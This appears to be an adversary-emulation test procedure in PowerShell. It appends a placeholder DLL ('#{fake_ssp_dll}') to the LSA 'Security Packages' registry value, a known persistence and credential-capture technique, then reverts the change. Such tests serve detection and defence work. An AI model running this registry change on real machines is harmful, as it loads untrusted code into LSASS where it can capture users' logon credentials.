# run these in sequence
$SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'
$SecurityPackagesUpdated = $SecurityPackages
$SecurityPackagesUpdated += "#{fake_ssp_dll}"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated

# revert (before reboot)
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages